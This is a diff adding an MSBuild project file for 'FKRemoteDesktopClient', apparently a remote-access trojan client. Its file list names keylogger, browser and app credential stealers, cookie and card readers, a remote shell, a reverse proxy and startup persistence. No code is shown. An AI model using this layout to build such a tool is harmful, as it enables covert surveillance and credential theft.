@@ -1,0 +1,456 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{59EDE693-E651-4A4B-B235-672613173B18}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>FKRemoteDesktop</RootNamespace>
+    <AssemblyName>FKRemoteDesktopClient</AssemblyName>
+    <TargetFrameworkVersion>v4.6.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <NoWarn>0672, 3021, 0618</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>FreeKnight.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ClientForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ClientForm.Designer.cs">
+      <DependentUpon>ClientForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Configs\SettingsFromClient.cs" />
+    <Compile Include="Configs\SettingsFromServer.cs" />
+    <Compile Include="Cryptography\Aes256.cs" />
+    <Compile Include="Cryptography\AesGcm256.cs" />
+    <Compile Include="Cryptography\JpgCompression.cs" />
+    <Compile Include="Cryptography\SafeComparison.cs" />
+    <Compile Include="Cryptography\Sha256.cs" />
+    <Compile Include="Debugger\Logger.cs" />
+    <Compile Include="DllHook\NativeMethods.cs" />
+    <Compile Include="Enums\EAccountType.cs" />
+    <Compile Include="Enums\EConnectionState.cs" />
+    <Compile Include="Enums\EContentType.cs" />
+    <Compile Include="Enums\EFileType.cs" />
+    <Compile Include="Enums\EJsonType.cs" />
+    <Compile Include="Enums\ELogType.cs" />
+    <Compile Include="Enums\EMessageType.cs" />
+    <Compile Include="Enums\EMouseAction.cs" />
+    <Compile Include="Enums\EProcessAction.cs" />
+    <Compile Include="Enums\EShutdownAction.cs" />
+    <Compile Include="Enums\EStartupType.cs" />
+    <Compile Include="Enums\EUserStatus.cs" />
+    <Compile Include="Extensions\DriveTypeExtensions.cs" />
+    <Compile Include="Extensions\IsNullExtension.cs" />
+    <Compile Include="Extensions\KeyExtensions.cs" />
+    <Compile Include="Extensions\ProcessExtensions.cs" />
+    <Compile Include="Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Extensions\SocketExtensions.cs" />
+    <Compile Include="Extensions\StringExtensions.cs" />
+    <Compile Include="Framework\FKClient.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Helpers\BatchFileHelper.cs" />
+    <Compile Include="Helpers\DateTimeHelper.cs" />
+    <Compile Include="Helpers\DecryptBrowsersHelper.cs" />
+    <Compile Include="Helpers\FileHelper.cs" />
+    <Compile Include="Helpers\GeoInformationHelper.cs" />
+    <Compile Include="Helpers\HardwareDevicesHelper.cs" />
+    <Compile Include="Helpers\HostConverterHelper.cs" />
+    <Compile Include="Helpers\JsonHelper.cs" />
+    <Compile Include="Helpers\NativeMethodsHelper.cs" />
+    <Compile Include="Helpers\PlatformHelper.cs" />
+    <Compile Include="Helpers\ProcessHelper.cs" />
+    <Compile Include="Helpers\RegistryHelper.cs" />
+    <Compile Include="Helpers\RegistryKeyHelper.cs" />
+    <Compile Include="Helpers\RegValueHelper.cs" />
+    <Compile Include="Helpers\ScreenHelper.cs" />
+    <Compile Include="Helpers\StringHelper.cs" />
+    <Compile Include="Helpers\SystemHelper.cs" />
+    <Compile Include="Install\ClientInstaller.cs" />
+    <Compile Include="Install\ClientSetupBase.cs" />
+    <Compile Include="Install\ClientStartup.cs" />
+    <Compile Include="Install\ClientUninstaller.cs" />
+    <Compile Include="Install\ClientUpdater.cs" />
+    <Compile Include="IPGeoLocation\GeoInformationRetriever.cs" />
+    <Compile Include="KeyLogger\Keylogger.cs" />
+    <Compile Include="KeyLogger\KeyloggerService.cs" />
+    <Compile Include="Message\IMessage.cs" />
+    <Compile Include="Message\IMessageProcessor.cs" />
+    <Compile Include="Message\ISender.cs" />
+    <Compile Include="Message\MessageHandler.cs" />
+    <Compile Include="Message\MessageStructs\Drive.cs" />
+    <Compile Include="Message\MessageStructs\FileChunk.cs" />
+    <Compile Include="Message\MessageStructs\FileSystemEntry.cs" />
+    <Compile Include="Message\MessageStructs\Process.cs" />
+    <Compile Include="Message\MessageStructs\RecoveredAccount.cs" />
+    <Compile Include="Message\MessageStructs\RegSeekerMatch.cs" />
+    <Compile Include="Message\MessageStructs\Resolution.cs" />
+    <Compile Include="Message\MessageStructs\StartupItem.cs" />
+    <Compile Include="Message\MessageStructs\TcpConnection.cs" />
+    <Compile Include="Message\SubMessageHandler\ClientServicesHandler.cs" />
+    <Compile Include="Message\MessageProcessorBase.cs" />
+    <Compile Include="Message\NotificationMessageProcessor.cs" />
+    <Compile Include="Message\SubMessageHandler\FileManagerHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\KeyloggerHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\MessageBoxHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\PasswordRecoveryHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\RegistryHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\RemoteDesktopHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\RemoteShellHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\ReverseProxyHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\ShutdownHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\StartupManagerHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\SystemInformationHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\TaskManagerHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\TcpConnectionsHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\TestMessageHandler.cs" />
+    <Compile Include="Message\SubMessageHandler\WebsiteVisitorHandler.cs" />
+    <Compile Include="Message\SubMessages\ClientIdentification.cs" />
+    <Compile Include="Message\SubMessages\ClientIdentificationResult.cs" />
+    <Compile Include="Message\SubMessages\DoAskElevate.cs" />
+    <Compile Include="Message\SubMessages\DoChangeRegistryValue.cs" />
+    <Compile Include="Message\SubMessages\DoClientDisconnect.cs" />
+    <Compile Include="Message\SubMessages\DoClientReconnect.cs" />
+    <Compile Include="Message\SubMessages\DoClientUninstall.cs" />
+    <Compile Include="Message\MessageStructs\RegValueData.cs" />
+    <Compile Include="Message\SubMessages\DoCloseConnection.cs" />
+    <Compile Include="Message\SubMessages\DoCreateRegistryKey.cs" />
+    <Compile Include="Message\SubMessages\DoCreateRegistryValue.cs" />
+    <Compile Include="Message\SubMessages\DoDeleteRegistryKey.cs" />
+    <Compile Include="Message\SubMessages\DoDeleteRegistryValue.cs" />
+    <Compile Include="Message\SubMessages\DoKeyboardEvent.cs" />
+    <Compile Include="Message\SubMessages\DoLoadRegistryKey.cs" />
+    <Compile Include="Message\SubMessages\DoMouseEvent.cs" />
+    <Compile Include="Message\SubMessages\DoPathDelete.cs" />
+    <Compile Include="Message\SubMessages\DoPathRename.cs" />
+    <Compile Include="Message\SubMessages\DoProcessEnd.cs" />
+    <Compile Include="Message\SubMessages\DoProcessResponse.cs" />
+    <Compile Include="Message\SubMessages\DoProcessStart.cs" />
+    <Compile Include="Message\SubMessages\DoRenameRegistryKey.cs" />
+    <Compile Include="Message\SubMessages\DoRenameRegistryValue.cs" />
+    <Compile Include="Message\SubMessages\DoShellExecute.cs" />
+    <Compile Include="Message\SubMessages\DoShellExecuteResponse.cs" />
+    <Compile Include="Message\SubMessages\DoShowMessageBox.cs" />
+    <Compile Include="Message\SubMessages\DoShutdownAction.cs" />
+    <Compile Include="Message\SubMessages\DoStartupItemAdd.cs" />
+    <Compile Include="Message\SubMessages\DoStartupItemRemove.cs" />
+    <Compile Include="Message\SubMessages\DoVisitWebsite.cs" />
+    <Compile Include="Message\SubMessages\FileTransferCancel.cs" />
+    <Compile Include="Message\SubMessages\FileTransferChunk.cs" />
+    <Compile Include="Message\SubMessages\FileTransferComplete.cs" />
+    <Compile Include="Message\SubMessages\FileTransferRequest.cs" />
+    <Compile Include="Message\SubMessages\GetChangeRegistryValueResponse.cs" />
+    <Compile Include="Message\SubMessages\GetConnections.cs" />
+    <Compile Include="Message\SubMessages\GetConnectionsResponse.cs" />
+    <Compile Include="Message\SubMessages\GetCreateRegistryKeyResponse.cs" />
+    <Compile Include="Message\SubMessages\GetCreateRegistryValueResponse.cs" />
+    <Compile Include="Message\SubMessages\GetDeleteRegistryKeyResponse.cs" />
+    <Compile Include="Message\SubMessages\GetDeleteRegistryValueResponse.cs" />
+    <Compile Include="Message\SubMessages\GetDesktop.cs" />
+    <Compile Include="Message\SubMessages\GetDesktopResponse.cs" />
+    <Compile Include="Message\SubMessages\GetDirectory.cs" />
+    <Compile Include="Message\SubMessages\GetDirectoryResponse.cs" />
+    <Compile Include="Message\SubMessages\GetDrives.cs" />
+    <Compile Include="Message\SubMessages\GetDrivesResponse.cs" />
+    <Compile Include="Message\SubMessages\GetKeyloggerLogsDirectory.cs" />
+    <Compile Include="Message\SubMessages\GetKeyloggerLogsDirectoryResponse.cs" />
+    <Compile Include="Message\SubMessages\GetMonitors.cs" />
+    <Compile Include="Message\SubMessages\GetMonitorsResponse.cs" />
+    <Compile Include="Message\SubMessages\GetPasswords.cs" />
+    <Compile Include="Message\SubMessages\GetPasswordsResponse.cs" />
+    <Compile Include="Message\SubMessages\GetProcesses.cs" />
+    <Compile Include="Message\SubMessages\GetProcessesResponse.cs" />
+    <Compile Include="Message\SubMessages\GetRegistryKeysResponse.cs" />
+    <Compile Include="Message\SubMessages\GetRenameRegistryKeyResponse.cs" />
+    <Compile Include="Message\SubMessages\GetRenameRegistryValueResponse.cs" />
+    <Compile Include="Message\SubMessages\GetStartupItems.cs" />
+    <Compile Include="Message\SubMessages\GetStartupItemsResponse.cs" />
+    <Compile Include="Message\SubMessages\GetSystemInfo.cs" />
+    <Compile Include="Message\SubMessages\GetSystemInfoResponse.cs" />
+    <Compile Include="Message\SubMessages\ReverseProxyConnect.cs" />
+    <Compile Include="Message\SubMessages\ReverseProxyConnectResponse.cs" />
+    <Compile Include="Message\SubMessages\ReverseProxyData.cs" />
+    <Compile Include="Message\SubMessages\ReverseProxyDisconnect.cs" />
+    <Compile Include="Message\SubMessages\SetStatus.cs" />
+    <Compile Include="Message\SubMessages\SetStatusFileManager.cs" />
+    <Compile Include="Message\SubMessages\SetUserStatus.cs" />
+    <Compile Include="Message\SubMessages\TestEmptyMessage.cs" />
+    <Compile Include="Message\SubMessages\TestMessage.cs" />
+    <Compile Include="Message\TypeRegistry.cs" />
+    <Compile Include="MouseKeyHook\Combination.cs" />
+    <Compile Include="MouseKeyHook\Hook.cs" />
+    <Compile Include="MouseKeyHook\HotKeys\HotKeyArgs.cs" />
+    <Compile Include="MouseKeyHook\HotKeys\HotKeySet.cs" />
+    <Compile Include="MouseKeyHook\HotKeys\HotKeySetCollection.cs" />
+    <Compile Include="MouseKeyHook\HotKeys\HotKeySetsListener.cs" />
+    <Compile Include="MouseKeyHook\IKeyboardEvents.cs" />
+    <Compile Include="MouseKeyHook\IKeyboardMouseEvents.cs" />
+    <Compile Include="MouseKeyHook\IMouseEvents.cs" />
+    <Compile Include="MouseKeyHook\Implementation\AppEventFacade.cs" />
+    <Compile Include="MouseKeyHook\Implementation\AppKeyListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\AppMouseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\BaseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\ButtonSet.cs" />
+    <Compile Include="MouseKeyHook\Implementation\Callback.cs" />
+    <Compile Include="MouseKeyHook\Implementation\Chord.cs" />
+    <Compile Include="MouseKeyHook\Implementation\EventFacade.cs" />
+    <Compile Include="MouseKeyHook\Implementation\GlobalEventFacade.cs" />
+    <Compile Include="MouseKeyHook\Implementation\GlobalKeyListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\GlobalMouseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\KeyboardState.cs" />
+    <Compile Include="MouseKeyHook\Implementation\KeyListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\KeysExtensions.cs" />
+    <Compile Include="MouseKeyHook\Implementation\MouseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\Subscribe.cs" />
+    <Compile Include="MouseKeyHook\KeyCombinationExtensions.cs" />
+    <Compile Include="MouseKeyHook\KeyEventArgsExt.cs" />
+    <Compile Include="MouseKeyHook\KeyPressEventArgsExt.cs" />
+    <Compile Include="MouseKeyHook\MouseEventExtArgs.cs" />
+    <Compile Include="MouseKeyHook\Sequence.cs" />
+    <Compile Include="MouseKeyHook\SequenceBase.cs" />
+    <Compile Include="MouseKeyHook\WinApi\AppMouseStruct.cs" />
+    <Compile Include="MouseKeyHook\WinApi\CallbackData.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookHelper.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookIds.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookNativeMethods.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookProcedure.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookProcedureHandle.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookResult.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HotkeysNativeMethods.cs" />
+    <Compile Include="MouseKeyHook\WinApi\KeyboardHookStruct.cs" />
+    <Compile Include="MouseKeyHook\WinApi\KeyboardNativeMethods.cs" />
+    <Compile Include="MouseKeyHook\WinApi\Messages.cs" />
+    <Compile Include="MouseKeyHook\WinApi\MouseNativeMethods.cs" />
+    <Compile Include="MouseKeyHook\WinApi\MouseStruct.cs" />
+    <Compile Include="MouseKeyHook\WinApi\Point.cs" />
+    <Compile Include="MouseKeyHook\WinApi\ThreadNativeMethods.cs" />
+    <Compile Include="Network\Client.cs" />
+    <Compile Include="Network\HostsManager.cs" />
+    <Compile Include="Network\PayloadReader.cs" />
+    <Compile Include="Network\PayloadWriter.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Protobuf\BclHelpers.cs" />
+    <Compile Include="Protobuf\BufferExtension.cs" />
+    <Compile Include="Protobuf\BufferPool.cs" />
+    <Compile Include="Protobuf\CallbackAttributes.cs" />
+    <Compile Include="Protobuf\Compiler\CompilerContext.cs" />
+    <Compile Include="Protobuf\Compiler\CompilerDelegates.cs" />
+    <Compile Include="Protobuf\Compiler\Local.cs" />
+    <Compile Include="Protobuf\DataFormat.cs" />
+    <Compile Include="Protobuf\DiscriminatedUnion.cs" />
+    <Compile Include="Protobuf\DiscriminatedUnion.Serializable.cs" />
+    <Compile Include="Protobuf\Extensible.cs" />
+    <Compile Include="Protobuf\ExtensibleUtil.cs" />
+    <Compile Include="Protobuf\GlobalSuppressions.cs" />
+    <Compile Include="Protobuf\Helpers.cs" />
+    <Compile Include="Protobuf\IExtensible.cs" />
+    <Compile Include="Protobuf\IExtension.cs" />
+    <Compile Include="Protobuf\ImplicitFields.cs" />
+    <Compile Include="Protobuf\IProtoInputT.cs" />
+    <Compile Include="Protobuf\IProtoOutputT.cs" />
+    <Compile Include="Protobuf\KeyValuePairProxy.cs" />
+    <Compile Include="Protobuf\Meta\AttributeMap.cs" />
+    <Compile Include="Protobuf\Meta\BasicList.cs" />
+    <Compile Include="Protobuf\Meta\CallbackSet.cs" />
+    <Compile Include="Protobuf\Meta\MetaType.cs" />
+    <Compile Include="Protobuf\Meta\ProtoSyntax.cs" />
+    <Compile Include="Protobuf\Meta\RuntimeTypeModel.cs" />
+    <Compile Include="Protobuf\Meta\SubType.cs" />
+    <Compile Include="Protobuf\Meta\TypeAddedEventArgs.cs" />
+    <Compile Include="Protobuf\Meta\TypeFormatEventArgs.cs" />
+    <Compile Include="Protobuf\Meta\TypeModel.cs" />
+    <Compile Include="Protobuf\Meta\TypeModel.InputOutput.cs" />
+    <Compile Include="Protobuf\Meta\ValueMember.cs" />
+    <Compile Include="Protobuf\NetObjectCache.cs" />
+    <Compile Include="Protobuf\PrefixStyle.cs" />
+    <Compile Include="Protobuf\ProtoContractAttribute.cs" />
+    <Compile Include="Protobuf\ProtoConverterAttribute.cs" />
+    <Compile Include="Protobuf\ProtoEnumAttribute.cs" />
+    <Compile Include="Protobuf\ProtoException.cs" />
+    <Compile Include="Protobuf\ProtoIgnoreAttribute.cs" />
+    <Compile Include="Protobuf\ProtoIncludeAttribute.cs" />
+    <Compile Include="Protobuf\ProtoMapAttribute.cs" />
+    <Compile Include="Protobuf\ProtoMemberAttribute.cs" />
+    <Compile Include="Protobuf\ProtoReader.cs" />
+    <Compile Include="Protobuf\ProtoWriter.cs" />
+    <Compile Include="Protobuf\SerializationContext.cs" />
+    <Compile Include="Protobuf\Serializer.cs" />
+    <Compile Include="Protobuf\Serializers\ArrayDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\BlobSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\BooleanSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\ByteSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\CharSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\CompiledSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\DateTimeSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\DecimalSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\DefaultValueDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\DoubleSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\EnumSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\FieldDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\GuidSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\ImmutableCollectionDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\Int16Serializer.cs" />
+    <Compile Include="Protobuf\Serializers\Int32Serializer.cs" />
+    <Compile Include="Protobuf\Serializers\Int64Serializer.cs" />
+    <Compile Include="Protobuf\Serializers\IProtoSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\IProtoTypeSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\ISerializerProxy.cs" />
+    <Compile Include="Protobuf\Serializers\ListDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\MapDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\MemberSpecifiedDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\NetObjectSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\NullDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\ParseableSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\PropertyDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\ProtoDecoratorBase.cs" />
+    <Compile Include="Protobuf\Serializers\ReflectedUriDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\SByteSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\SingleSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\StringSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\SubItemSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\SurrogateSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\SystemTypeSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\TagDecorator.cs" />
+    <Compile Include="Protobuf\Serializers\TimeSpanSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\TupleSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\TypeSerializer.cs" />
+    <Compile Include="Protobuf\Serializers\UInt16Serializer.cs" />
+    <Compile Include="Protobuf\Serializers\UInt32Serializer.cs" />
+    <Compile Include="Protobuf\Serializers\UInt64Serializer.cs" />
+    <Compile Include="Protobuf\Serializers\UriDecorator.cs" />
+    <Compile Include="Protobuf\ServiceModel\ProtoBehaviorAttribute.cs" />
+    <Compile Include="Protobuf\ServiceModel\ProtoBehaviorExtensionElement.cs" />
+    <Compile Include="Protobuf\ServiceModel\ProtoEndpointBehavior.cs" />
+    <Compile Include="Protobuf\ServiceModel\ProtoOperationBehavior.cs" />
+    <Compile Include="Protobuf\ServiceModel\XmlProtoSerializer.cs" />
+    <Compile Include="Protobuf\SubItemToken.cs" />
+    <Compile Include="Protobuf\WireType.cs" />
+    <Compile Include="Stealer\Browsers\BravePasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\ChromePasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\ChromiumCardReader.cs" />
+    <Compile Include="Stealer\Browsers\ChromiumCookieReader.cs" />
+    <Compile Include="Stealer\Browsers\EdgePasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\FileZillaPasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\FirefoxPasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\InternetExplorerPasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\MozillaCookieReader.cs" />
+    <Compile Include="Stealer\Browsers\MozillaPasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\OperaGXPasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\OperaPasswordReader.cs" />
+    <Compile Include="Stealer\Apps\WinScpPasswordReader.cs" />
+    <Compile Include="Stealer\Browsers\YandexPasswordReader.cs" />
+    <Compile Include="Stealer\DB\SQLHandler.cs" />
+    <Compile Include="Stealer\Helper\ChromiumBase.cs" />
+    <Compile Include="Stealer\Helper\ChromiumDecryptor.cs" />
+    <Compile Include="Stealer\Helper\CNT.cs" />
+    <Compile Include="Stealer\Helper\ExplorerUrlHistory.cs" />
+    <Compile Include="Stealer\Helper\FF.cs" />
+    <Compile Include="Stealer\Helper\FireFoxDecryptor.cs" />
+    <Compile Include="Stealer\Helper\GeckoCore.cs" />
+    <Compile Include="Stealer\Helper\ROW.cs" />
+    <Compile Include="Stealer\Helper\SortFileTimeAscendingHelper.cs" />
+    <Compile Include="Stealer\Helper\SZ.cs" />
+    <Compile Include="Stealer\Helper\Win32ExplorerApi.cs" />
+    <Compile Include="Stealer\IAccountReader.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="Shell\ShellSession.cs" />
+    <Compile Include="Structs\SGeoInformation.cs" />
+    <Compile Include="Structs\SGeoResponse.cs" />
+    <Compile Include="Structs\SHost.cs" />
+    <Compile Include="Structs\SLvItem.cs" />
+    <Compile Include="Structs\SRegistrySeeker.cs" />
+    <Compile Include="Structs\SUserAccount.cs" />
+    <Compile Include="Structs\SUserInfo.cs" />
+    <Compile Include="UserActivity\ActivityDetection.cs" />
+    <Compile Include="Utilities\ByteConverter.cs" />
+    <Compile Include="Utilities\FileSplit.cs" />
+    <Compile Include="Utilities\JsonArray.cs" />
+    <Compile Include="Utilities\JsonObject.cs" />
+    <Compile Include="Utilities\JsonPrimitive.cs" />
+    <Compile Include="Utilities\JsonReader.cs" />
+    <Compile Include="Utilities\JsonValue.cs" />
+    <Compile Include="Utilities\SafeRandom.cs" />
+    <Compile Include="Utilities\SingleInstanceMutex.cs" />
+    <Compile Include="Utilities\UnsafeStreamCodec.cs" />
+    <EmbeddedResource Include="ClientForm.resx">
+      <DependentUpon>ClientForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="FreeKnight.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <WCFMetadata Include="Connected Services\" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
